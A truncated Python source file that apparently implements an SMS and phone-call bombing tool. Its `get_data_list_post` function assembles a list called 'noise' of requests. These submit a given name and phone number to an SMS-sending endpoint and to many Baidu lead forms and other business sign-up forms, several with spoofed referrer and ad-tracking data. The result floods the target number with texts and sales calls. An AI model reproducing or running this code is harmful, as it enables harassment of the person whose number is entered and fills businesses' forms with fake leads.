import asyncio
import json
from bright import _post, _get
from bright import ftime


async def get_data_list_post(n, t):
    now = ftime.get_timestamp()
    noise = [
        {
            "url": "https://msg.huangqi1688.com/message/mess_sms.php",
            "data": {
                "mess_tel": t,
                "mess_ip": "192.168.0.1"
            }
        },
        {
            "headers": {
                "Content-Type": "multipart/form-data;"
            },
            "url": "http://data.gzxhce.com/plus/Formto3jj.php",
            "data": {
                "name": "{}".format(n),
                "mobile": "{}".format(t),
                "fromurl": "http://www.gzxhdn.cn/"
            },
        },
        {
            "url": "https://leads.baidu.com/rest/form/c/sessions/null/submissions",
            "data": {
                "input": [{
                    "code": "xquG",
                    "value": "{}".format(n)
                }, {
                    "code": "NTDi",
                    "value": "{}".format(t)
                }],
                "ad_trace": {
                    "anti_code": "http://www.baidu.com/baidu.php?url=af000001rviya5oDqdTY1TT7kYlj8TlA1Rtq6L8KrFMZz2qeao9iFVjb00Ezz_782TaSTrjewt8h-e_2w_lcbo-yQW5myfPIYPlaRtxWl5z97SXxP2zXj-ia-Ef7ZsW6kxjldRwA0F9_c4keTFc02lqkbioFIHMQy_5hrofdPzpOtdiIYPrb6iUX7MY1KOxbbod10DVccZcg-jKe7eU9Vh3yJDN7.DD_NR2Ar5Od66qWvmJ_Z-sFzEuB3phmbfwECF63nEjswqAolcrh1uYdtRltSiEIjMecXzZ5_erhZrM_tILHYtIhOWgjLd3hcELq5AQqO4IE4JerZtLeqtTLeOSEW7-YOw7-OtZw7SLjIJoSgyAGW_lLltHA8OKqXazZOsXEV9SNMzLSLqOO6gvyHx2z1gOcOxxSU4xSaUweZGW4UQQApZKOsrB16_____dvpVIMzWttMlO59i1fIOs5l543Edt5MfOvIZOmBo4IhkLSEOB4ROQ_keDOeg4MkdqAHSWvtEtWKsOtKr85-dwxMO5S5SdvOCNOlOCIsOqWqECHODlPp-muCyrreI3tN.U1Yk0ZDqsE2LEsKspynqn0KY5TQzVet0pyYqnWcd0ATqUvwlnfKdpHdBmy-bIfKspyfqP0KWpyfqrHn0UgfqPj0vn7tknjDLg1csPH7xnH0krfKopHYk0ZFY5Hn3P6KBpHYkPHNxnHR3g1csP7tznHIxPH010AdW5Hn1njb1PHDkPH7xnHbknWfdPWnsPNtznjRkg100TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qnfKzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqTZnVuLG8TsKGuAnqiD4a0ZKCIZbq0Zw9ThI-IjYvndtsg1Ddn0KYIgnqn16znjcsP1nvrHTYPWRvPWmkPfKzug7Y5HDvn1Dsnj61rj63Pjb0Tv-b5yR4PAfYPWf3nj0sPjmzrj60mLPV5RPKPWbsnH6krjP7nYRdPDn0mynqnfKsUWYs0Z7VIjYs0Z7VT1Ys0Aw-I7qWTADqn0KlIjYs0AdWgvuzUvYqn7tsg1Kxn0Kbmy4dmhNxTAk9Uh-bT1Ysg1Kxn7ts0ZK9I7qhUA7M5H00uAPGujYs0ANYpyfqQHD0mgPsmvnqn0KdTA-8mvnqn0KkUymqn0KhmLNY5H00pgPWUjYs0A7buhk9u1Yk0Akhm1Ys0AwWmvfq0Zwzmyw-5HR4njckPsKBuA-b5H6YPW-KPRuKPHF7rDD3fYuKwWnLn1-awjRzrHKjrDc40AFY5H00Uv7YI1Ys0AqY5HD0ULFsIjYzc10Wnznknj0sc1TzrH0znWnzrandnj0snandnj0sna3snj0snj0WnznYr1bWnanLPinsQW0snjDsnankQW0drHDsn0K3TLwd5HnsPjbzrj610Z7xIWYsQW6Lg108njKxna3sn7tsQWmvg108nHPxna34rNtsQWmYg100mMPxTZFEuA-b5H00ThqGuhk9u1Yk0APv5fKGTdqWTADqn0KWTjYs0AN1IjYs0APzm1YkPWckn0&us=newvui&xst=mWY3Pjm4fHNAfHRzwH9KrDPAfRm1P1n4fbfdnWbsf19arf715HDvrjDknHTsnWR4njbdrj0vPW0sg1czPNts0gTqsE2LEs7k5TQzVetKIHY1njf4nW63ns7Y5HDvn1Dsnj61rjbKUgDqn0cs0BYKmv6quhPxTAnKUZRqn07WUWdBmy-bIfDzrjn1n16dP1m4&cegduid=n10YrHc3rjn&solutionId=7957809&word=",
                    "searchid": "e94d464800046288",
                    "cmatch": 225,
                    "rank": 0
                },
                "_embedded": {
                    "session": {
                        "solution_id": 13148473,
                        "scene_code": "lpgrjs"
                    }
                }
            }
        },
        {
            "url": "https://jzapi.baidu.com/rest/form/c/sessions"
                   "/6c6b88902d0e4022800f69f690adee9e/submissions?reqid=4b534c47-cdca-4c95-02f5"
                   "-{}".format(now),
            "data": {
                "input": [{
                    "code": "WFWR",
                    "value": "{}".format(n),
                    "name": "称呼",
                    "type": "name"
                }, {
                    "code": "cvNK",
                    "value": "{}".format(t),
                    "name": "电话",
                    "type": "phone"
                }],
                "action": {
                    "show_type": 0,
                    "action_prod": 2,
                    "tuoguan_page_id": 79840307,
                    "tuoguan_site_id": 56853077,
                    "tuoguan_app_id": 269,
                    "tuoguan_pv_id": "163100866479614260100",
                    "exp_ids": "70819-1_65247-1_72440-1_72913-1_69059-1_55294-1_72527-1_62230-1_54210-dz_73242-1_74324-dz_72757-dz_73350-1_70213-2_74539-1_69002-1_54209-1_53921-dz",
                    "page_url": "https://qianhu.wejianzhan.com/site/wjz3vxgv/942fb1fb-2863-4f62-a45b"
                                "-ac0f5a064710?showpageinpc=1&timestamp={}".format(now),
                    "abtest_url": "",
                    "use_history_info": True
                },
                "ba_hector": "840gckgsmvms1gjeduf0c",
                "ad_trace": {
                    "fid": "",
                    "anti_code": "https://qianhu.wejianzhan.com/site/wjz3vxgv/942fb1fb-2863-4f62-a45b-ac0f5a064710?fid=nHm3nHDkP10zPHbsrHR3njmvnjKxnWcdg1c&ch=4&bfid=fbuFw0cKBAcD0D9AHXb00rD006DBiIDK4z5AD0s000K4GkUEw60000f0gf0DsE2LEzoNY_M8vqoatoXOQnM51x2OkoMuVev48oXOkoLnJazetTB9dSefsV578qvUecja"
                },
                "_embedded": {
                    "session": {
                        "version": -1,
                        "solution_id": 7594493,
                        "scene_code": "wwpxee",
                        "user_id": 30492962
                    }
                }
            }
        },
        {

            "url": "https://jzapi.baidu.com/rest/form/c/sessions/00fe4d961f1c4378a9bf2d7bfbf297bd/submissions?reqid=4b534c47-7f9f-4ac4-da5a-{}".format(
                now),
            "data": {
                "input": [{
                    "code": "LJjQ",
                    "value": "{}".format(n),
                    "name": "称呼",
                    "type": "name"
                }, {
                    "code": "ZoxD",
                    "value": "{}".format(t),
                    "name": "电话",
                    "type": "phone"
                }, {
                    "code": "uMDe",
                    "value": "30万-40万",
                    "name": "单选",
                    "type": "radio"
                }],
                "action": {
                    "show_type": 0,
                    "action_prod": 2,
                    "tuoguan_page_id": 63263594,
                    "tuoguan_site_id": 54612905,
                    "tuoguan_app_id": 269,
                    "tuoguan_pv_id": "163100895718311476880",
                    "exp_ids": "70819-1_69059-1_55294-1_72527-1_72440-dz_72757-1_74348-dz_70146-4_62230-1_74324-dz_53921-1_73350-1_70213-2_74539-1_60975-1_73315-1_69002-1_65247-dz",
                    "page_url": "https://aisite.wejianzhan.com/site/mengtachongwu.com/164d6ec0-33c5-40c2-9c88-6fe114636095?showpageinpc=1&timestamp=1631008956317",
                    "abtest_url": "",
                    "use_history_info": True
                },
                "ba_hector": "2481b9u8q63v1gjee7f0c",
                "ad_trace": {
                    "fid": "",
                    "anti_code": "https://aisite.wejianzhan.com/site/mengtachongwu.com/164d6ec0-33c5-40c2-9c88-6fe114636095?fid=nH01n10znHndrj64PWckrHbLPH-xnWcdg1D&ch=4&bfid=fbuFw0cK1Y6K0cI2gct00rD00fDwmtnKlR1d06s000KtvCCWw60000f0gf0D_SWre1gcJeMlsp1QSQSJ_SWretA_zOBdl_5cY2ZQOaLNSegJsS2LYUxv_qm__XJstIUazJHHoo1icgZSUoT&bd_vid=nH01n10znHndrj64PWckrHbLPH-xnWcdg17xnH0s&sdclkid=AL2s152iArD6A5epALFl"
                },
                "_embedded": {
                    "session": {
                        "version": -1,
                        # "solution_id": 11944041,
                        "scene_code": "wwpxee",
                        "user_id": 29582097
                    }
                }
            }
        },
        {
            "url": "https://leads.baidu.com/rest/form/c/sessions/null/submissions",
            "data": {
                "input": [{
                    "code": "WYFf",
                    "value": "安庆"
                }, {
                    "code": "Esgc",
                    "value": "{}".format(n)
                }, {
                    "code": "ZXvy",
                    "value": "{}".format(n)
                }, {
                    "code": "QKUD",
                    "value": "{}".format(t)
                }],
                "ad_trace": {
                    "anti_code": "http://www.baidu.com/baidu.php?url=0f0000jZHD87BOAleYb6UTHfEN8jlHbVJz6ADvLGJixagHYKx-qMen3-Q-5lGK0fjYam76U-ktDVnSjihe2s_ooCx7KwGcozBSJdq0EEr72O8EX8_22ZtImymndQEwS2C93di-G6WV2DfTa3F4AdqAzJa8o3p_MGk0TJ7bVeCkx3JLZkZk1RWnSYVkZe_raXyoiuMy4A0pAoUNpt7FCfLpxhbvWj.DD_iFtovTyKDaUvTyaaWWuk3lrWEnMyhuWFbotxZGLImeCp5UBmqEltbIXecOv1xQGq8el3SWSB4i_nYQAHuE_e7.U1Yk0ZDqsxxKEsKspynqnfKY5IHdYxMn3TMq_PhvznZLsUt0pyYqnWcd0ATqTZPYT6KdpHdBmy-bIfKspyfqP0KWpyfqrHn0UgfqPj0vn-tknjD4g1DsnHIxnW0dnNt1nj0z0AVG5HD0TMfqPjTY0AFG5HDdPNtkPH9xnW0Yg1ckPdtdnjn0Uynqn1c3n1mvnWDYrNtkrjmzPjRkn1mkg1D4nHcLrjDYnj-xnW0dnNtknjc0TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn0KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqTZnVuLG8TsKGuAnqiD4K0ZKCIZbq0Zw9ThI-IjY1nNt1nHwxnHb0IZN15HDkPWbkPWR4nH03rH0knHD4nWnL0ZF-TgfqnHm1nHDLn1cvPHT4PfK1pyfquyR4nAc3rHDsnj0LP1I-mfKWTvYqPRRdPjbvnH77nYfkf1wDf6K9m1Yk0ZK85H00TydY5H00Tyd15H00XMfqn0KVmdqhThqV5HKxn7tsg1Kxn0Kbmy4dmhNxTAk9Uh-bT1Ysg1Kxn7tsg1nLP1b4PjR0TA7Ygvu_myTqn0Kbmv-b5H00ugwGujYVnfK9TLKWm1Ys0ZNspy4Wm1Ys0Z7VuWYs0AuWIgfqn0KGTvP_5H00mywhUA7M5HD0UAuW5H00uAPWujY0IZF9uARqrjDsnH010AFbpyfqnHmknH6YwDnYfW-7n1bYnj0vPjTzwD7jPbR3njf1nHT0UvnqnfKBIjYk0Aq9IZTqn0KEIjYk0AqzTZfqninsc1nWnin4PWcznjDdc10Wna3snj0snj0Wninkc10WQinsQW0snj0snankQW0snjDsn0K3TLwd5HD1rjDYnWT0TNqv5H08PWPxna3sn7tsQW0sg108PWPxna3sn-tsQW63g108nHFxn0KBTdqsThqbpyfqn0KzUv-hUA7M5H00mLmq0A-1gvPsmHYs0APs5H00ugPY5H00mLFW5Hf3nHfs&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HDLnHbsPjfzP1DsPH61Pjfkn16vg1czPNts0gTqd5gwST19zxvsvUUcsxxKEs7k5TZLsUtKIHYkn16kPjcL0gfqnHm1nHDLn1cvP67VTHYs0W0aQf7Wpjdhmdqsms7_IHYs0yP85yF9pywd0Hnvrj0vnHDLnjc&word=",
                    "searchid": "ee90b891000777ea",
                    "cmatch": 225,
                    "rank": 0
                },
                "_embedded": {
                    "session": {
                        "solution_id": 3356588,
                        "scene_code": "lpgrjs"
                    }
                }
            }
        },
        {
            "url": "https://jzapi.baidu.com/fengming-c/clue-audit/risk/lp-submit/expose?reqid"
                   "=4b534c47-b1d0-4c3d-3d23-163117424661",
            "data": {
                "clueJoinId": "210909163698039090",
                "userId": 32446419,
                "solutionId": 9817768,
                "solutionType": "form",
                "lpInfo": {
                    "appId": 269,
                    "siteId": 55145747,
                    "pageId": 66780348,
                    "lpUrl": "https://isite.baidu.com/site/wjzr8row/696377d3-f31d-4f69-9877-2eb75b1989a0?fid=nHczrHm1nHndnjRzPWn1rj63PWFxnWcdg1D&ch=4&bfid=fbuFw0cKE66f05kZGpC00rD00fZH7StKNitDX6_0000fHz2h500000f0gf0DdejfLBLRv_M8vqoNYVXsYP3VsS2LYTM5stgKEeXOQtMCEnUfGeMe1UsVEEBz8toNVqDywHCE&bd_vid=nHczrHm1nHndnjRzPWn1rj63PWFxnWcdg17xnH0s&bd_vid=10923412564617805337"
                },
                "clueInfo": {
                    "formControls": [{
                        "name": "房子是否在深圳(非深圳无优惠)",
                        "value": "房子不在深圳",
                        "type": "radio"
                    }, {
                        "name": "面积",
                        "value": "90㎡以下",
                        "type": "radio"
                    }, {
                        "name": "称呼",
                        "value": "{}".format(n),
                        "type": "name"
                    }, {
                        "name": "电话",
                        "value": "{}".format(t),
                        "type": "phone"
                    }],
                    "captcha": {
                        "type": "no",
                        "phoneNo": "{}".format(t)
                    }
                },
                "clientInfo": {},
                "adInfo": {
                    "referrer": "https://www.baidu.com/baidu.php?url=0f00000uEDLSpLgiCherL47e_xV_QNmVDvckfgmImOY_sAl0nw40JMxZiwrVLZweeTJKaW2C0pOX8mDt-WTO1FZC3Sx2eMioy0akn80Bd6YVDqCbcOiSdw7jYNO8vnJ7SoaZRBWrMzcKAS8baxDt2FagF3VeVDLeUXbyxrvaMgdOaoYnohcvbTppaiC6JSZ7jTApRRWtmqsmHxFq3QEn56gT5lE-.DD_NR2Ar5Od66xAS6MzEukmDfwECF63nEjP_hIsfIrOG3S5WIk1lSPIvx_dqrO5EvX5WMzFEtIdqXOuEu_eltHDget5jPSOGoBOxB8BzOlSZtLeTNTvgG3OhOUSEw7SLjIJoSgyAGW_lLltHA8OKqXazZOsXxHYlePLUOcORkOjuuPtoQPxtWqOkOA9O35zECxQO6I5QuuuuoOx3T-ylzzzz1guJdvx24rggSEdOgOoSW-OBU5CqWEzOqWOBO3DxOmOPkO3COkzxoOeZlZtHIZfdxSj1HOs5l54lZtH3xrQOudOJFOBFoOvmOSQ1tOg9vRZx-O3EutVZKSOt5MdE84xCknwxEstnLeSh8QqS2lQQOo3x1xVkN1uXMWSUqElqDgeTPvJEklcELecd2s1f_I-MH3ed.U1Yk0ZDqdejfL6KspynqnfKsTv-MUWYvuH7hnyczuhPBnWIbP1fzPA7WmWFhny7bPhN9PyDdu6KY5TM8vqog_PjX0A-V5HczPfKM5gK1n6KdpHdBmy-bIfKspyfqP0KWpyfqrHn0UgfqnH0kPdtznjRkg1csPWFxnH0krNt1nj0L0AVG5H00TMfqPjTY0AFG5HDdPNtkPH9xnW0Yg1ckPdtdnjn0UynqnHbsrH6Lrj63P-tznjRkg17xn7tknjc0TgKGujYs0Z7Wpyfqn0KzuLw9u1Ys0A7B5HKxn0K-ThTqn6KsTjYs0A4vTjYsQW0snj0snj0s0AdYTjYs0AwbUL0qn0KzpWYs0Aw-IWdsmsKhIjYs0ZKC5H00ULnqn0KBI1Ykn0K8IjYs0ZPl5fK9TdqGuAnqTZnVuLG8TsKGuAnqiD4K0ZKCIZbq0Zw9ThI-IjYvndtsg1nY0ZwdT1YkPjfzrHmYPH63njf3rjT3njDLP6Kzug7Y5HDvn1DkP1fznH0vrHD0Tv-b5y79mHRYPvuWnj0knj03mhR0mLPV5HN7PHf4PWDkwHPDnRnYwDc0mynqnfKsUWYs0Z7VIjYs0Z7VT1Ys0Aw-I7qWTADqn0KlIjYs0AdWgvuzUvYqn7tsg1Kxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7tsg1KxPHRYn16YnsKsmgwxuhk9u1Ys0AwWpyfqn0K-IA-b5iYk0A71TAPW5H00IgKGUhPW5H00Tydh5H00uhPdIjYs0A-1mvsqn0K9uAu_myTqnfK_uhnqn0KbmvPb5fKYTh7buHYs0AFbpyfqnHmknH6YwDnYfW-7n1bYnj0vPjTzwD7jPbR3njf1nHT0UvnqnfKBIjYs0Aq9IZTqn0KEIjYk0AqzTZfqnBnsc1nen10WnH0snanvnj04PWmLnWnWPH0dnj0WPH0dnj08nj0snj0sc1DWPj_vc10WQinsQW0snjDsnankQW0snjDsn0K3TLwd5HnzPjfvPjD40Z7xIWYsQWb3g108njKxna3sn7tsQWmdg108nHwxna34rNtsQWRzg100mMPxTZFEuA-b5H00ThqGuhk9u1Yk0APv5fKGTdqWTADqn0KWTjYs0AN1IjYs0APzm1Yvn1nzPf&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HDznWbvn1D1PH0dnWm1n163rjmzg1czPNts0gTqzXeUvVXsYP3KTHLg_PjX0gRqn1cYPjmYnHbKIjYkPWnknHTYnWDk0ydk5H0an0cV0yPC5yuWgLKW0ykd5H0Kmv3qmh7GuZRKn1n1nj0sPHTvPf&word=&ck=2753.8.95.416.177.537.185.271&shh=www.baidu.com&sht=baidu&wd=&bc=110101"
                }
            }
        },
        {
            "url": "https://agent.getlingxi.cn/api/form",
            "data": {
                # "pageId": "704c986a-f55b-496b-b90e-3c3e3f59c839",
                "formId": "1619688393965",
                "formName": "弹窗表单",
                "pageId":1,
                "meta": {
                    "hostname": "lingxi.ikongjian.com",
                    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
                    "url": "https://lingxi.ikongjian.com/20210429?&utm_source=sem&utm_medium=baidu&utm_account=%E8%8B%8F%E5%B7%9E%E5%9C%B0%E5%9F%9F%E8%B4%A6%E6%88%B7&utm_plan=%E6%B7%B1%E5%9C%B3%2DPC%2D%E8%A1%8C%E4%B8%9A&utm_unit=%E8%A1%8C%E4%B8%9A%2D%E8%A1%8C%E4%B8%9A%2D%E9%80%9A%E7%94%A8&utm_keyword=%E6%B7%B1%E5%9C%B3%E8%A3%85%E4%BF%AE&utm_page=PC061&utm_city=sz&trig=nm&utm_creativeId=51601235367&utm_e_keywordid=301445252901&bd_vid=11046606271153942822",
                    "referrer": "https://www.baidu.com/baidu.php?url=0f00000uEDLSpLgiCWvqbDALAV30EKCRjDEvKg6hzZcWEa-9XWVbdyy_LlGYLeWSncYAqROfK3a8pDJjOWndarcGcxpfKoieu3SvrbHrULwc7RtLoEZ5tPlH0_s7ou4HrWBZfLR8xKRFjEgTryMZyYKyinSwQz_cRgGxvR4x5B4YbyrKe4vdEqOo9luVB7HZBpXxA0550CroZOnxhlseDlBRXY4v.7R_NR2Ar5Od66CE1IjOFOpeP-X1DBjFubo_enhOEdsRP5QAeKPa-BPrMo6CpXgih4SjikX1BsIT7jHz_ss8swRAn5M_se5gj_S8Z1LmxgkseO5j4e_rO3T5ou9tqvZxqTrOl3x5u9qX1jeXMj4qrZu_sSEWdsRP5QWC_knmx5GsSEW9qpt5M8seO9sSEZjbSg4E9s45-9tqhZvd3IMs3x5_sS81jEqEgKfYt8aFqKWj4en5Vose59sSxu9qIhZxeTrH4mx5u9qVXZutrZ1en5o_seOU9zxQj4etrz1jEq8Z1tTrO_sSLudsRP5QvGYTjGohn5MY3xgksSVXZ1LmIOs3xgW9tqhZvtTr1I9tS1jlOgjex5o6CpXgA1JikSU3UrhEo6CpXy7qjfkZsqpD1qHDyMo6CpXyAuQPKOYFSq1AlEG_ozTILZGtX8a9G4RtEpMwsrh8knTU2S1_LuPvHxuyGyAp7WFEenB6.U1Y10ZDqdejfL6KspynqnfKY5TM8vqog_PjX0A-V5HczPfKM5gK1n6KdpHdBmy-bIfKspyfqP0KWpyfqrHn0UgfqnH0kPdtznjRkg1DsnH-xn1czr0KopHYs0ZFY5HfLP0KBpHYkPHNxnHR3g1csP7tznHIxPH010AdW5HD4njbsnHbkrjFxnW0dnNtsg1Dsn6KkTA-b5H00TyPGujYs0ZFMIA7M5H00mycqn7ts0ANzu1Yz0ZKs5H00UMus5H08nj0snj0snj00Ugws5H00uAwETjYs0ZFJ5H00uANv5gKW0AuY5H00TA6qn0KET1Ys0AFL5HDs0A4Y5H00TLCq0A71gv-bm1dsTzdMXh410A-bm1dcHbD0TA9YXHY0IA7zuvNY5Hm1g1Kxn1f0IZN15HDYnW04PH6kP1cYnH6dn164rHmY0ZF-TgfqnHm1nHDLPjcknjm4nfK1pyfqmy79PHfLuhnsnjDsnj9BufKWTvYqPRRdPjbvnH77nYfkf1wDf6K9m1Yk0ZK85H00TydY5H00Tyd15H00uANYgvPsmHYs0ZGY5H00UyPxuMFEUHYsg1Kxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7tsg1Rznjb3nWc0TA7Ygvu_myTqn0Kbmv-b5H00ugwGujYVnfK9TLKWm1Ys0ZNspy4Wm1Ys0Z7VuWYs0AuWIgfqn0KGTvP_5H00mywhUA7M5HD0UAuW5H00uAPWujY0IZF9uARqn0KBuA-b5HDvnHD3PDwjPDc4wHn4Pj0sPWfLnbwKf1u7rj0Yn1DL0AqW5HD0mMfqn0KEmgwL5H00ULfqnfKETMKY5HcWnan1c1cWnHmLnjTYnWn3c1Rvnj0sc1Rvnj0sQW0snj0snankc1cWnandninsQW0LPHD3rankQW0snjDsn0K3TLwd5HnsrH0kPHnv0Z7xIWYsQWb3g108njKxna3sn7tsQWR4g108njIxni3sn7tsQWTsg100mMPxTZFEuA-b5H00ThqGuhk9u1Yk0APv5fKGTdqWTADqn0KWTjYs0AN1IjYs0APzm1YdnHfLr0&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HDznWbvn1D1PH0dnWm1n163rjmzg1czPNtz0gTqzXeUvVXsYP3KTHLg_PjX0gRqn104njDdn1mKIjYkPWnknHTYnWDk0ydk5H0an0cV0yPC5yuWgLKW0ykd5H0Kmv3qmh7GuZRKnHTvP1cdPHf4P6&word=&ck=4841.16.104.461.324.537.185.620&shh=www.baidu.com&sht=baidu&wd=&bc=110101",
                    "pageviewId": "184b7a5f-cebd-4d47-9939-7cd6d6f707c0",
                    "context": {
                        "timezone": "GMT+8",
                        "language": "zh-CN",
                        "screen": {
                            "width": 1680,
                            "height": 1050
                        }
                    },
                    "utm": None,
                    "device": "pc",
                    "webhookId": "29c6c217-dbcb-427d-9874-5b08bd87080e"
                },
                "cvUpload": {
                    "id": "ce9e263e-f664-4f0f-a24f-0557f2ff3fa5"
                },
                "wechat": {},
                "formValues":
                    {
                        "name": "{}".format(n),
                        "areaName ": "广州",
                        "mobile": "{}".format(t),
                        "name_1": "123",
                        "FORM_NAME": "弹窗表单",
                        "PAGE_URL": "https: //lingxi.ikongjian.com/20210429?&utm_source=sem&utm_medium=baidu&utm_account=%E8%8B%8F%E5%B7%9E%E5%9C%B0%E5%9F%9F%E8%B4%A6%E6%88%B7&utm_plan=%E6%B7%B1%E5%9C%B3%2DPC%2D%E8%A1%8C%E4%B8%9A&utm_unit=%E8%A1%8C%E4%B8%9A%2D%E8%A1%8C%E4%B8%9A%2D%E9%80%9A%E7%94%A8&utm_keyword=%E6%B7%B1%E5%9C%B3%E8%A3%85%E4%BF%AE&utm_page=PC061&utm_city=sz&trig=nm&utm_creativeId=51601235367&utm_e_keywordid=301445252901&bd_vid=11046606271153942822",
                        "PAGE_REFERRER": "https://www.baidu.com/baidu.php?url=0f00000uEDLSpLgiCWvqbDALAV30EKCRjDEvKg6hzZcWEa-9XWVbdyy_LlGYLeWSncYAqROfK3a8pDJjOWndarcGcxpfKoieu3SvrbHrULwc7RtLoEZ5tPlH0_s7ou4HrWBZfLR8xKRFjEgTryMZyYKyinSwQz_cRgGxvR4x5B4YbyrKe4vdEqOo9luVB7HZBpXxA0550CroZOnxhlseDlBRXY4v.7R_NR2Ar5Od66CE1IjOFOpeP-X1DBjFubo_enhOEdsRP5QAeKPa-BPrMo6CpXgih4SjikX1BsIT7jHz_ss8swRAn5M_se5gj_S8Z1LmxgkseO5j4e_rO3T5ou9tqvZxqTrOl3x5u9qX1jeXMj4qrZu_sSEWdsRP5QWC_knmx5GsSEW9qpt5M8seO9sSEZjbSg4E9s45-9tqhZvd3IMs3x5_sS81jEqEgKfYt8aFqKWj4en5Vose59sSxu9qIhZxeTrH4mx5u9qVXZutrZ1en5o_seOU9zxQj4etrz1jEq8Z1tTrO_sSLudsRP5QvGYTjGohn5MY3xgksSVXZ1LmIOs3xgW9tqhZvtTr1I9tS1jlOgjex5o6CpXgA1JikSU3UrhEo6CpXy7qjfkZsqpD1qHDyMo6CpXyAuQPKOYFSq1AlEG_ozTILZGtX8a9G4RtEpMwsrh8knTU2S1_LuPvHxuyGyAp7WFEenB6.U1Y10ZDqdejfL6KspynqnfKY5TM8vqog_PjX0A-V5HczPfKM5gK1n6KdpHdBmy-bIfKspyfqP0KWpyfqrHn0UgfqnH0kPdtznjRkg1DsnH-xn1czr0KopHYs0ZFY5HfLP0KBpHYkPHNxnHR3g1csP7tznHIxPH010AdW5HD4njbsnHbkrjFxnW0dnNtsg1Dsn6KkTA-b5H00TyPGujYs0ZFMIA7M5H00mycqn7ts0ANzu1Yz0ZKs5H00UMus5H08nj0snj0snj00Ugws5H00uAwETjYs0ZFJ5H00uANv5gKW0AuY5H00TA6qn0KET1Ys0AFL5HDs0A4Y5H00TLCq0A71gv-bm1dsTzdMXh410A-bm1dcHbD0TA9YXHY0IA7zuvNY5Hm1g1Kxn1f0IZN15HDYnW04PH6kP1cYnH6dn164rHmY0ZF-TgfqnHm1nHDLPjcknjm4nfK1pyfqmy79PHfLuhnsnjDsnj9BufKWTvYqPRRdPjbvnH77nYfkf1wDf6K9m1Yk0ZK85H00TydY5H00Tyd15H00uANYgvPsmHYs0ZGY5H00UyPxuMFEUHYsg1Kxn7ts0Aw9UMNBuNqsUA78pyw15HKxn7tsg1Rznjb3nWc0TA7Ygvu_myTqn0Kbmv-b5H00ugwGujYVnfK9TLKWm1Ys0ZNspy4Wm1Ys0Z7VuWYs0AuWIgfqn0KGTvP_5H00mywhUA7M5HD0UAuW5H00uAPWujY0IZF9uARqn0KBuA-b5HDvnHD3PDwjPDc4wHn4Pj0sPWfLnbwKf1u7rj0Yn1DL0AqW5HD0mMfqn0KEmgwL5H00ULfqnfKETMKY5HcWnan1c1cWnHmLnjTYnWn3c1Rvnj0sc1Rvnj0sQW0snj0snankc1cWnandninsQW0LPHD3rankQW0snjDsn0K3TLwd5HnsrH0kPHnv0Z7xIWYsQWb3g108njKxna3sn7tsQWR4g108njIxni3sn7tsQWTsg100mMPxTZFEuA-b5H00ThqGuhk9u1Yk0APv5fKGTdqWTADqn0KWTjYs0AN1IjYs0APzm1YdnHfLr0&us=newvui&xst=mWYkPWDkrjwDf1warRR1rHfsnjmYP1FDfRnvwH6sPjnkPs715HDznWbvn1D1PH0dnWm1n163rjmzg1czPNtz0gTqzXeUvVXsYP3KTHLg_PjX0gRqn104njDdn1mKIjYkPWnknHTYnWDk0ydk5H0an0cV0yPC5yuWgLKW0ykd5H0Kmv3qmh7GuZRKnHTvP1cdPHf4P6&word=&ck=4841.16.104.461.324.537.185.620&shh=www.baidu.com&sht=baidu&wd=&bc=110101",
                        "PAGE_START": 1631174485908,
                        "STAY_TIME": 45635,
                        "PAGE_VERSION": "城市套餐价格:深圳,展厅大小:深圳"}
            }},
        {

            "url": "https://jzapi.baidu.com/rest/form/c/sessions?reqid=4b534c47-e6b6-49b4-d07b-{}".format(now),
            "data": {
            "input": [{
                "code": "DELF",
                "value": "{}".format(n),
                "name": "称呼",
                "type": "name"
            }, {
                "code": "RSLN",
                "value": "{}".format(t),
                "name": "电话",
                "type": "phone"
            }, {
                "code": "pOZM",
                "value": "是",
                "name": "是否有门店",
                "type": "radio"
            }],
            "action": {
                "show_type": 0,
                "action_prod": 2,
                "tuoguan_page_id": 86062604,
                "tuoguan_site_id": 57346963,
                "tuoguan_app_id": 269,
                "tuoguan_pv_id": "163117488084419838858",
                "exp_ids": "70819-1_67560-dz_73634-dz_72913-1_74348-1_69059-1_55294-1_72527-1_72440-dz_49904-dz_54211-1_62230-1_53921-1_73350-1_57358-1_73094-dz_70213-2_73210-dz_73708-dz_73703-1_50632-dz_69002-1_54209-1_65247-dz",
                "page_url": "https://qianhu.wejianzhan.com/site/wjzubzox/bdd9f959-04b3-4ece-95f8-12e87f277216?showpageinpc=1&timestamp={}".format(now),
                "abtest_url": "",
                "use_history_info": True
            },
            "ba_hector": "240gapkunu4k1gjjg8j0c",
            "ad_trace": {
                "fid": "",
                "anti_code": "https://qianhu.wejianzhan.com/site/wjzubzox/bdd9f959-04b3-4ece-95f8-12e87f277216?fid=nHRsPHDdnjbvrH6znWRkrHfkn1NxnWcdg1n&ch=4&bfid=fbuFw0cK-Yf507rY3I000rD00sAcv66a03llQ6s000joyqZzi00000f0gf0DEPQNOWcdnU1i1py4LQ1iEP5jze1idxldlBLcJqjak252Ei1cJe5nVOp1dBYsEJLwlI2zkP1gqWaKEFs&bd_vid=nHRsPHDdnjbvrH6znWRkrHfkn1NxnWcdg1PxnH0s"
            },
            "_embedded": {
                "session": {
                    "version": -1,
                    "solution_id": 12532935,
                    "scene_code": "wwpxee",
                    "user_id": 34134664
                }
            }
        }},
        {
